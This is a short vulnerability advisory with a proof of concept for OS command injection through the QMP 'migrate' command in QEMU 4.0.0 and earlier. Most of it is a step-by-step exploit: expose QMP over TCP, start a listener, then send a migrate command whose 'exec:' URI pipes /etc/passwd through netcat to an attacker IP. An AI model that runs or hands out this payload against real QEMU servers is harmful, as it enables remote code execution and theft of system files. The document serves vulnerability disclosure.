# Overview
The QMP **migrate** command in QEMU version 4.0.0 and earlier is vulnerable to OS command injection, which allows the remote attacker to achieve code execution, denial of service, or information disclosure by sending a crafted QMP command to the listening server.

1st, execute the QEMU with `-qmp tcp:<ip_address>:1234,server,nowait`
2nd, open another console and setup a listener to port 9999
3rd, connect to the target and enter the following commands:

# Proof-of-Concept
{% highlight json %}
{ "execute": "qmp_capabilities" }
{"return": {}}
{ "execute": "migrate", "arguments": { "uri": "exec:cat /etc/passwd | nc <attacker_ip> 9999" } }
{"return": {}}
{% endhighlight %}
